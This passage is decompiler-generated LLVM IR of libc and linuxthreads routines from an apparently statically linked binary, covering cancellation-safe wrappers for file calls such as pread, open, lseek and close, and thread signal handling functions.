  %v3_10005084 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10005084, i32 0)
  ret i32 %v5_10005074
}

define i32 @pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v2_100050bc = ptrtoint i32* %stack_var_-40 to i32
  store i32 268456140, i32* @lr, align 4
  %v3_100050c8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100050bc)
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  %v0_100050d8 = load i32, i32* %r29.global-to-local, align 4
  store i32 268456160, i32* @lr, align 4
  %v4_100050dc = call i32 @__libc_pread(i32 %v0_100050d8, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_100050dc, i32* %r29.global-to-local, align 4
  %v3_100050e8 = load i32, i32* %stack_var_-40, align 4
  store i32 268456176, i32* @lr, align 4
  %v2_100050ec = trunc i32 %v3_100050e8 to i8
  %v3_100050ec = call i32 @__GI_pthread_setcanceltype(i8 %v2_100050ec, i32 0)
  ret i32 %v4_100050dc

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @pause() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10005114 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_10005124.213 to i32), i32* @lr, align 4
  %v3_10005120 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10005114)
  store i32 268456232, i32* @lr, align 4
  %v1_10005124 = call i32 @__libc_pause(i32 %v3_10005120)
  %v3_10005130 = load i32, i32* %stack_var_-40, align 4
  store i32 268456248, i32* @lr, align 4
  %v2_10005134 = trunc i32 %v3_10005130 to i8
  %v3_10005134 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10005134, i32 0)
  ret i32 %v1_10005124
}

define i32 @open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10005168 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268456312, i32* @lr, align 4
  %v3_10005174 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10005168)
  store i32 268456356, i32* @lr, align 4
  %v3_100051a0 = call i32 @__GI___libc_open64(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_100051a8 = load i32, i32* %stack_var_-40, align 4
  store i32 268456372, i32* @lr, align 4
  %v2_100051b0 = trunc i32 %v3_100051a8 to i8
  %v3_100051b0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100051b0, i32 0)
  ret i32 %v3_100051a0
}

define i32 @open(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100051e4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268456436, i32* @lr, align 4
  %v3_100051f0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100051e4)
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 268456480, i32* @lr, align 4
  %v0_1000521c = call i32 @__libc_open()
  %v3_10005224 = load i32, i32* %stack_var_-40, align 4
  store i32 268456496, i32* @lr, align 4
  %v2_1000522c = trunc i32 %v3_10005224 to i8
  %v3_1000522c = call i32 @__GI_pthread_setcanceltype(i8 %v2_1000522c, i32 0)
  ret i32 %v0_1000521c
}

define i32 @nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v2_10005260 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268456556, i32* @lr, align 4
  %v3_10005268 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10005260)
  store i32 268456568, i32* @lr, align 4
  %v0_10005274 = call i32 @__libc_nanosleep()
  store i32 %v0_10005274, i32* @r29, align 4
  %v3_10005280 = load i32, i32* %stack_var_-40, align 4
  store i32 268456584, i32* @lr, align 4
  %v2_10005284 = trunc i32 %v3_10005280 to i8
  %v3_10005284 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10005284, i32 0)
  %v0_1000528c = load i32, i32* @r29, align 4
  ret i32 %v0_1000528c
}

define i32 @msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100052b8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268456648, i32* @lr, align 4
  %v3_100052c4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100052b8)
  store i32 268456664, i32* @lr, align 4
  %v3_100052d4 = call i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_100052e0 = load i32, i32* %stack_var_-40, align 4
  store i32 268456680, i32* @lr, align 4
  %v2_100052e4 = trunc i32 %v3_100052e0 to i8
  %v3_100052e4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100052e4, i32 0)
  ret i32 %v3_100052d4
}

define i32 @lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000530c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268456748, i32* @lr, align 4
  %v3_10005328 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1000530c)
  store i32 268456768, i32* @lr, align 4
  %v4_1000533c = call i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_10005344 = load i32, i32* %stack_var_-40, align 4
  store i32 268456788, i32* @lr, align 4
  %v2_10005350 = trunc i32 %v3_10005344 to i8
  %v3_10005350 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10005350, i32 0)
  ret i32 %v4_1000533c
}

define i32 @lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10005388 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268456856, i32* @lr, align 4
  %v3_10005394 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10005388)
  store i32 268456872, i32* @lr, align 4
  %v3_100053a4 = call i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_100053b0 = load i32, i32* %stack_var_-40, align 4
  store i32 268456888, i32* @lr, align 4
  %v2_100053b4 = trunc i32 %v3_100053b0 to i8
  %v3_100053b4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100053b4, i32 0)
  ret i32 %v3_100053a4
}

define i32 @fsync(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100053dc = ptrtoint i32* %stack_var_-40 to i32
  store i32 268456944, i32* @lr, align 4
  %v3_100053ec = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100053dc)
  store i32 268456952, i32* @lr, align 4
  %v1_100053f4 = call i32 @__libc_fsync(i32 %arg1)
  %v3_10005400 = load i32, i32* %stack_var_-40, align 4
  store i32 268456968, i32* @lr, align 4
  %v2_10005404 = trunc i32 %v3_10005400 to i8
  %v3_10005404 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10005404, i32 0)
  ret i32 %v1_100053f4
}

define i32 @fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10005438 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268457032, i32* @lr, align 4
  %v3_10005444 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10005438)
  store i32 268457076, i32* @lr, align 4
  %v2_10005470 = call i32 @__libc_fcntl(i32 %arg1, i32 %arg2)
  %v3_10005478 = load i32, i32* %stack_var_-40, align 4
  store i32 268457092, i32* @lr, align 4
  %v2_10005480 = trunc i32 %v3_10005478 to i8
  %v3_10005480 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10005480, i32 0)
  ret i32 %v2_10005470
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100054a8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268457148, i32* @lr, align 4
  %v3_100054b8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100054a8)
  store i32 268457156, i32* @lr, align 4
  %v1_100054c0 = call i32 @__libc_close(i32 %arg1)
  %v3_100054cc = load i32, i32* %stack_var_-40, align 4
  store i32 268457172, i32* @lr, align 4
  %v2_100054d0 = trunc i32 %v3_100054cc to i8
  %v3_100054d0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100054d0, i32 0)
  ret i32 %v1_100054c0

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 42, 43, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 52, 53, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 38, 39, 48, 49, 44, 45, 40, 41, 46, 47, 30, 31, 32, 33, 34, 35, 36, 37, 50, 51 }
}

define i32 @__libc_current_sigrtmin() local_unnamed_addr {
entry:
  %v3_100054f0 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @global_var_1002abd8.214, i32 0, i32 0), align 4
  ret i32 %v3_100054f0
}

define i32 @__libc_current_sigrtmax() local_unnamed_addr {
entry:
  %v3_100054fc = load i32, i32* @global_var_1002abdc.215, align 4
  ret i32 %v3_100054fc
}

define i32 @__libc_allocate_rtsig(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000550c = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @global_var_1002abd8.214, i32 0, i32 0), align 4
  %v3_10005510 = icmp eq i32 %v3_1000550c, -1
  br i1 %v3_10005510, label %dec_label_pc_10005548, label %dec_label_pc_10005518

dec_label_pc_10005518:                            ; preds = %entry
  %v3_10005518 = load i32, i32* @global_var_1002abdc.215, align 4
  %v3_10005520 = icmp sgt i32 %v3_1000550c, %v3_10005518
  br i1 %v3_10005520, label %dec_label_pc_10005548, label %dec_label_pc_10005528

dec_label_pc_10005528:                            ; preds = %dec_label_pc_10005518
  %v3_1000551c = icmp eq i32 %arg1, 0
  br i1 %v3_1000551c, label %dec_label_pc_1000553c, label %dec_label_pc_10005534

dec_label_pc_10005534:                            ; preds = %dec_label_pc_10005528
  %v1_10005528 = add i32 %v3_1000550c, 1
  store i32 %v1_10005528, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @global_var_1002abd8.214, i32 0, i32 0), align 4
  br label %dec_label_pc_1000554c

dec_label_pc_1000553c:                            ; preds = %dec_label_pc_10005528
  %v1_1000552c = add i32 %v3_10005518, -1
  store i32 %v1_1000552c, i32* @global_var_1002abdc.215, align 4
  br label %dec_label_pc_1000554c

dec_label_pc_10005548:                            ; preds = %dec_label_pc_10005518, %entry
  br label %dec_label_pc_1000554c

dec_label_pc_1000554c:                            ; preds = %dec_label_pc_1000553c, %dec_label_pc_10005534, %dec_label_pc_10005548
  %v0_1000554c = phi i32 [ %v3_10005518, %dec_label_pc_1000553c ], [ %v3_1000550c, %dec_label_pc_10005534 ], [ -1, %dec_label_pc_10005548 ]
  ret i32 %v0_1000554c

; uselistorder directives
  uselistorder label %dec_label_pc_1000554c, { 2, 0, 1 }
}

define i32 @__GI_pthread_self() local_unnamed_addr {
entry:
  %v0_10005554 = load i32, i32* @r2, align 4
  %v1_10005554 = add i32 %v0_10005554, 16
  %v2_10005554 = inttoptr i32 %v1_10005554 to i32*
  %v3_10005554 = load i32, i32* %v2_10005554, align 4
  ret i32 %v3_10005554
}

define i32 @pthread_equal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_handle_sigdebug() local_unnamed_addr {
entry:
  %v0_1000556c = load i32, i32* @r3, align 4
  ret i32 %v0_1000556c
}

define i32 @__pthread_setconcurrency(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1002f014.216, align 4
  ret i32 0
}

define i32 @__pthread_getconcurrency() local_unnamed_addr {
entry:
  %v3_10005584 = load i32, i32* @global_var_1002f014.216, align 4
  ret i32 %v3_10005584
}

define i32 @__pthread_timedsuspend_new(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-904 = alloca i32, align 4
  %stack_var_-760 = alloca i32, align 4
  %stack_var_-888 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  store i32 1, i32* @r4, align 4
  store i32 268457392, i32* @lr, align 4
  %v3_100055ac = call i32 @__sigsetjmp(i32* nonnull %stack_var_-624, i32 1)
  %v3_100055b0 = icmp eq i32 %v3_100055ac, 0
  store i32 1, i32* %r9.global-to-local, align 4
  br i1 %v3_100055b0, label %dec_label_pc_100055bc, label %entry.dec_label_pc_1000567c_crit_edge

entry.dec_label_pc_1000567c_crit_edge:            ; preds = %entry
  %.pre = add i32 %arg1, 36
  %.pre1 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_1000567c

dec_label_pc_100055bc:                            ; preds = %entry
  %v2_10005598 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v2_100055c4 = ptrtoint i32* %stack_var_-888 to i32
  store i32 %v2_100055c4, i32* @r29, align 4
  %v2_100055c8 = add i32 %arg1, 36
  %v3_100055c8 = inttoptr i32 %v2_100055c8 to i32*
  store i32 %v2_10005598, i32* %v3_100055c8, align 4
  %v1_100055cc = load i32, i32* %r9.global-to-local, align 4
  %v2_100055cc = add i32 %v1_100055cc, 32
  %v3_100055cc = inttoptr i32 %v2_100055cc to i32*
  store i32 0, i32* %v3_100055cc, align 4
  store i32 268457432, i32* @lr, align 4
  %v1_100055d4 = call i32 @sigemptyset(i32 %v2_100055c4)
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_100055dc = load i32, i32* @global_var_1002ef54.217, align 4
  store i32 %v2_100055c4, i32* @r3, align 4
  store i32 268457448, i32* @lr, align 4
  %v2_100055e4 = call i32 @__GI_sigaddset(i32 %v2_100055c4, i32 %v3_100055dc)
  %v2_100055f0 = ptrtoint i32* %stack_var_-760 to i32
  store i32 268457464, i32* @lr, align 4
  %v3_100055f4 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_100055c4, i32 %v2_100055f0)
  %v2_100055fc = ptrtoint i32* %stack_var_-904 to i32
  %v1_10005618 = add i32 %tmp, 4
  %v2_10005618 = inttoptr i32 %v1_10005618 to i32*
  br label %dec_label_pc_100055f8

dec_label_pc_100055f8:                            ; preds = %dec_label_pc_1000565c, %dec_label_pc_100055bc
  store i32 268457476, i32* @lr, align 4
  %v2_10005600 = call i32 @gettimeofday(i32 %v2_100055fc, i32 0)
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v3_10005618 = load i32, i32* %v2_10005618, align 4
  %v2_1000561c = load i32, i32* %arg2, align 4
  %tmp16 = mul i32 %tmp4, -1000
  %v2_10005620 = add i32 %v3_10005618, %tmp16
  store i32 %v2_10005620, i32* @r11, align 4
  %v3_10005624 = load i32, i32* %stack_var_-904, align 4
  %v2_10005630 = sub i32 %v2_1000561c, %v3_10005624
  store i32 %v2_10005630, i32* %r9.global-to-local, align 4
  %not.tmp15 = icmp slt i32 %v2_10005620, 0
  %v1_10005638 = sext i1 %not.tmp15 to i32
  %v2_10005630.v1_10005638 = add i32 %v2_10005630, %v1_10005638
  %v1_10005654 = icmp slt i32 %v2_10005630.v1_10005638, 0
  br i1 %v1_10005654, label %dec_label_pc_10005668, label %dec_label_pc_1000565c

dec_label_pc_1000565c:                            ; preds = %dec_label_pc_100055f8
  store i32 268457568, i32* @lr, align 4
  %v0_1000565c = call i32 @__libc_nanosleep()
  %v3_10005660 = icmp eq i32 %v0_1000565c, 0
  br i1 %v3_10005660, label %dec_label_pc_10005668, label %dec_label_pc_100055f8

dec_label_pc_10005668:                            ; preds = %dec_label_pc_1000565c, %dec_label_pc_100055f8
  store i32 ptrtoint ([3 x i8]* @global_var_10005678.218 to i32), i32* @lr, align 4
  %v3_10005674 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_100055f0, i32 0)
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000567c

dec_label_pc_1000567c:                            ; preds = %entry.dec_label_pc_1000567c_crit_edge, %dec_label_pc_10005668
  %v3_10005684.pre-phi = phi i32* [ %.pre1, %entry.dec_label_pc_1000567c_crit_edge ], [ %v3_100055c8, %dec_label_pc_10005668 ]
  store i32 %arg1, i32* @r10, align 4
  store i32 0, i32* %v3_10005684.pre-phi, align 4
  %v0_10005690 = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_10005690

; uselistorder directives
  uselistorder i32 %v2_10005620, { 1, 0 }
  uselistorder i32 %v2_100055c4, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-624, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 6, 0, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 ()* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1000567c, { 1, 0 }
}

define i32 @__pthread_restart_new() local_unnamed_addr {
entry:
  %v0_100056b8 = load i32, i32* @r3, align 4
  %v1_100056b8 = add i32 %v0_100056b8, 20
  %v2_100056b8 = inttoptr i32 %v1_100056b8 to i32*
  %v3_100056b8 = load i32, i32* %v2_100056b8, align 4
  %v3_100056bc = load i32, i32* @global_var_1002ef54.217, align 4
  store i32 268457668, i32* @lr, align 4
  %v2_100056c0 = call i32 @kill(i32 %v3_100056b8, i32 %v3_100056bc)
  ret i32 %v2_100056c0
}

define i32 @__pthread_wait_for_restart_signal() local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %v2_100056e4 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_100056e4, i32* @r29, align 4
  %v0_100056e8 = load i32, i32* @r3, align 4
  store i32 %v0_100056e8, i32* @r31, align 4
  store i32 268457724, i32* @lr, align 4
  %v3_100056f8 = call i32 @__GI_sigprocmask(i32 2, i32 0, i32 %v2_100056e4)
  store i32 %v2_100056e4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000570c.219 to i32), i32* @lr, align 4
  %v1_10005708 = call i32 @__GI_sigdelset(i32 %v2_100056e4)
  %v1_10005710 = load i32, i32* @r31, align 4
  %v2_10005710 = add i32 %v1_10005710, 32
  %v3_10005710 = inttoptr i32 %v2_10005710 to i32*
  store i32 0, i32* %v3_10005710, align 4
  br label %dec_label_pc_10005714

dec_label_pc_10005714:                            ; preds = %dec_label_pc_10005714, %entry
  store i32 268457756, i32* @lr, align 4
  %v1_10005718 = call i32 @__libc_sigsuspend(i32 %v2_100056e4)
  %v3_10005720 = load i32, i32* @global_var_1002ef54.217, align 4
  store i32 %v3_10005720, i32* @r9, align 4
  %v0_10005724 = load i32, i32* @r31, align 4
  %v1_10005724 = add i32 %v0_10005724, 32
  %v2_10005724 = inttoptr i32 %v1_10005724 to i32*
  %v3_10005724 = load i32, i32* %v2_10005724, align 4
  %v4_10005728 = icmp eq i32 %v3_10005724, %v3_10005720
  br i1 %v4_10005728, label %dec_label_pc_10005730, label %dec_label_pc_10005714

dec_label_pc_10005730:                            ; preds = %dec_label_pc_10005714
  ret i32 %v1_10005718

; uselistorder directives
  uselistorder i32 %v2_100056e4, { 1, 3, 2, 0, 4 }
}

define i32 @suspend(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10005748 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10005748
}

define i32 @pthread_onexit_process(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_1000575c = load i32, i32* @r2, align 4
  store i32 %v0_1000575c, i32* @r31, align 4
  %v3_10005764 = load i32, i32* @global_var_1002ef34.220, align 4
  %v1_10005768 = icmp slt i32 %v3_10005764, 0
  br i1 %v1_10005768, label %entry.dec_label_pc_100057ec_crit_edge, label %dec_label_pc_10005770

entry.dec_label_pc_100057ec_crit_edge:            ; preds = %entry
  %v0_100057fc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100057ec

dec_label_pc_10005770:                            ; preds = %entry
  store i32 %v0_1000575c, i32* %stack_var_-168, align 4
  %v2_10005784 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v3_10005764, i32* %r3.global-to-local, align 4
  store i32 268457876, i32* @lr, align 4
  %v2_100057909 = call i32 @__libc_write(i32 %v3_10005764, i32 %v2_10005784)
  store i32 %v2_100057909, i32* %r3.global-to-local, align 4
  %v3_1000579412 = icmp eq i32 %v2_100057909, -1
  br i1 %v3_1000579412, label %dec_label_pc_1000579c, label %dec_label_pc_100057ac

dec_label_pc_1000579c:                            ; preds = %dec_label_pc_10005770, %dec_label_pc_1000579c.dec_label_pc_10005780_crit_edge
  %v0_1000579c = call i32 @__errno_location()
  store i32 %v0_1000579c, i32* %r3.global-to-local, align 4
  %v1_100057a0 = inttoptr i32 %v0_1000579c to i32*
  %v2_100057a0 = load i32, i32* %v1_100057a0, align 4
  %v3_100057a4 = icmp eq i32 %v2_100057a0, 4
  br i1 %v3_100057a4, label %dec_label_pc_1000579c.dec_label_pc_10005780_crit_edge, label %dec_label_pc_100057ac

dec_label_pc_1000579c.dec_label_pc_10005780_crit_edge: ; preds = %dec_label_pc_1000579c
  %v3_10005788.pre = load i32, i32* @global_var_1002ef34.220, align 4
  store i32 %v3_10005788.pre, i32* %r3.global-to-local, align 4
  store i32 268457876, i32* @lr, align 4
  %v2_10005790 = call i32 @__libc_write(i32 %v3_10005788.pre, i32 %v2_10005784)
  store i32 %v2_10005790, i32* %r3.global-to-local, align 4
  %v3_10005794 = icmp eq i32 %v2_10005790, -1
  br i1 %v3_10005794, label %dec_label_pc_1000579c, label %dec_label_pc_100057ac

dec_label_pc_100057ac:                            ; preds = %dec_label_pc_1000579c, %dec_label_pc_1000579c.dec_label_pc_10005780_crit_edge, %dec_label_pc_10005770
  %v0_100057ac = load i32, i32* @r31, align 4
  store i32 %v0_100057ac, i32* @r3, align 4
  store i32 268457908, i32* @lr, align 4
  %v1_100057b0 = call i32 @suspend(i32 %v0_100057ac)
  store i32 %v1_100057b0, i32* %r3.global-to-local, align 4
  %v3_100057b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32 -4304) to i32*), align 4
  %v0_100057bc = load i32, i32* @r31, align 4
  %v4_100057bc = icmp eq i32 %v0_100057bc, %v3_100057b8
  br i1 %v4_100057bc, label %dec_label_pc_100057c4, label %dec_label_pc_100057ec

dec_label_pc_100057c4:                            ; preds = %dec_label_pc_100057ac
  %v3_100057cc = load i32, i32* @global_var_1002a954.221, align 4
  store i32 %v3_100057cc, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100057d8.222 to i32), i32* @lr, align 4
  %v3_100057d4 = call i32 @waitpid(i32 %v3_100057cc, i32 0, i32 -2147483648)
  store i32 %v3_100057d4, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_1002f000.223, align 4
  store i32 0, i32* @global_var_1002f004.224, align 4
  br label %dec_label_pc_100057ec

dec_label_pc_100057ec:                            ; preds = %entry.dec_label_pc_100057ec_crit_edge, %dec_label_pc_100057ac, %dec_label_pc_100057c4
  %v0_100057fc = phi i32 [ %v0_100057fc.pre, %entry.dec_label_pc_100057ec_crit_edge ], [ %v1_100057b0, %dec_label_pc_100057ac ], [ %v3_100057d4, %dec_label_pc_100057c4 ]
  ret i32 %v0_100057fc

; uselistorder directives
  uselistorder i32 %v2_10005784, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 8, 9, 7, 3, 2, 0, 1 }
  uselistorder i32 268457876, { 1, 0 }
  uselistorder label %dec_label_pc_100057ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100057ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000579c, { 1, 0 }
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %v3_10005818 = load i32, i32* @global_var_1002ef34.220, align 4
  %v0_10005820 = load i32, i32* @r2, align 4
  store i32 %v0_10005820, i32* @r31, align 4
  store i32 -1, i32* @r28, align 4
  %v3_10005828 = icmp eq i32 %v3_10005818, -1
  br i1 %v3_10005828, label %dec_label_pc_10005860, label %dec_label_pc_10005830

dec_label_pc_10005830:                            ; preds = %entry
  %v3_10005830 = load i32, i32* @global_var_1002f000.223, align 4
  store i32 %v3_10005830, i32* @r3, align 4
  store i32 268458040, i32* @lr, align 4
  %v0_10005834 = call i32 @free()
  %v3_10005838 = load i32, i32* @global_var_1002ef34.220, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_1002f000.223, align 4
  store i32 0, i32* @global_var_1002f004.224, align 4
  store i32 268458064, i32* @lr, align 4
  %v1_1000584c = call i32 @__libc_close(i32 %v3_10005838)
  %v3_10005850 = load i32, i32* @global_var_1002f01c.225, align 4
  store i32 268458072, i32* @lr, align 4
  %v1_10005854 = call i32 @__libc_close(i32 %v3_10005850)
  %v0_10005858 = load i32, i32* @r28, align 4
  store i32 %v0_10005858, i32* @global_var_1002ef34.220, align 4
  store i32 %v0_10005858, i32* @global_var_1002f01c.225, align 4
  br label %dec_label_pc_10005860

dec_label_pc_10005860:                            ; preds = %entry, %dec_label_pc_10005830
  store i32 268458084, i32* @lr, align 4
  %v0_10005860 = call i32 @__libc_getpid()
  %v1_10005868 = load i32, i32* @r31, align 4
  %v2_10005868 = add i32 %v1_10005868, 20
  %v3_10005868 = inttoptr i32 %v2_10005868 to i32*
  store i32 %v0_10005860, i32* %v3_10005868, align 4
  %v0_1000586c = load i32, i32* @r31, align 4
  store i32 %v0_1000586c, i32* @global_var_1002ef30, align 4
  store i32 ptrtoint (i32* @global_var_1002f050.226 to i32), i32* %r9.global-to-local, align 4
  %v2_10005878 = inttoptr i32 %v0_1000586c to i32*
  store i32 %v0_1000586c, i32* %v2_10005878, align 4
  %v0_1000587c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000587c = load i32, i32* @r31, align 4
  %v2_1000587c = add i32 %v1_1000587c, 76
  %v3_1000587c = inttoptr i32 %v2_1000587c to i32*
  store i32 %v0_1000587c, i32* %v3_1000587c, align 4
  store i32 ptrtoint (i32* @global_var_1002f04c.227 to i32), i32* %r9.global-to-local, align 4
  %v0_10005888 = load i32, i32* @r31, align 4
  %v2_10005888 = add i32 %v0_10005888, 4
  %v3_10005888 = inttoptr i32 %v2_10005888 to i32*
  store i32 %v0_10005888, i32* %v3_10005888, align 4
  %v0_1000588c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000588c = load i32, i32* @r31, align 4
  %v2_1000588c = add i32 %v1_1000588c, 68
  %v3_1000588c = inttoptr i32 %v2_1000588c to i32*
  store i32 %v0_1000588c, i32* %v3_1000588c, align 4
  ret i32 %v0_10005860

; uselistorder directives
  uselistorder i32 %v0_10005888, { 1, 0 }
  uselistorder i32 %v0_1000586c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10005860, { 1, 0 }
}

define i32 @__pthread_kill_other_threads_np() local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  store i32 268458176, i32* @lr, align 4
  %v2_100058bc = call i32 @pthread_onexit_process(i32 0, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_100058c4.228 to i32), i32* @lr, align 4
  %v0_100058c0 = call i32 @__pthread_reset_main_thread()
  %v2_100058c4 = ptrtoint i32* %stack_var_-164 to i32
  store i32 268458188, i32* @lr, align 4
  %v1_100058c8 = call i32 @sigemptyset(i32 %v2_100058c4)
  %v3_100058d4 = load i32, i32* @global_var_1002ef54.217, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 268458224, i32* @lr, align 4
  %v4_100058ec = call i32 @__libc_sigaction(i32 %v3_100058d4, i32* nonnull %stack_var_-168, i32 0)
  %v3_100058f8 = load i32, i32* @global_var_1002ef58.229, align 4
  store i32 268458244, i32* @lr, align 4
  %v4_10005900 = call i32 @__libc_sigaction(i32 %v3_100058f8, i32* nonnull %stack_var_-168, i32 0)
  %v3_10005908 = load i32, i32* @global_var_1002ef5c.230, align 4
  %tmp7 = icmp slt i32 %v3_10005908, 1
  br i1 %tmp7, label %dec_label_pc_10005920, label %dec_label_pc_1000591c

dec_label_pc_1000591c:                            ; preds = %entry
  store i32 268458272, i32* @lr, align 4
  %v4_1000591c = call i32 @__libc_sigaction(i32 %v3_10005908, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_10005920

dec_label_pc_10005920:                            ; preds = %entry, %dec_label_pc_1000591c
  %v0_10005930 = phi i32 [ %v3_10005908, %entry ], [ %v4_1000591c, %dec_label_pc_1000591c ]
  ret i32 %v0_10005930

; uselistorder directives
  uselistorder i32 ()* @__pthread_reset_main_thread, { 1, 0 }
